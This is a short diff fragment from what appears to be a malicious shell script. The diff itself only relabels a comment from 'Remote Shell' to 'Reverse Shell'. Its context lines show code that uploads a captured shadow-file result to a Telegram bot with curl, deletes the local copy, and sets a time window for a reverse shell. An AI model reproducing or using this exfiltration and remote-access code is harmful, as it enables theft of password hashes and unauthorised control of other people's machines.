@@ -158,7 +158,7 @@ if [ $? -eq 0 ]; then
     curl -F chat_id="$chat_id" -F document=@"$result_shadow" "https://api.telegram.org/bot$token/sendDocument"
     rm "$result_shadow"
 
-    # Remote Shell enabled for 30 minutes
+    # Reverse Shell enabled for 30 minutes
     h=$(date +"%H:%M")
     start="14:00"
     stop="14:30"
